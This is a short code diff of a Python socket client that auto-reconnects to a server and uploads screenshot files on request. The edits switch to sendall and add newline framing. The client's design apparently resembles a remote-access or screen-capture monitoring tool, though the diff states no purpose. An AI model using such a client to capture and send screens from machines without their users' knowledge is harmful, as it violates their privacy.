@@ -33,11 +33,11 @@ while True:
 print("Connected to server!")
 
 def send_to_server(msg):
-    client.send(msg.encode())
+    client.sendall((msg + "\n").encode())
 
 while True:
     try:
-        data = client.recv(1024).decode()
+        data = client.recv(1024).decode().strip()
     except:
         print("Server disconnected. Reconnecting...")
         client.close()
@@ -138,7 +138,7 @@ while True:
 
             filesize = os.path.getsize(filename)
 
-            client.send(f"SCREEN {filename} {filesize}".encode())
+            client.sendall(f"SCREEN {filename} {filesize}\n".encode()) 
 
             time.sleep(1)
 
@@ -149,7 +149,7 @@ while True:
                     if not chunk:
                         break
 
-                    client.send(chunk)
+                    client.sendall(chunk)
 
             send_to_server("Screenshot sent successfully!")
 
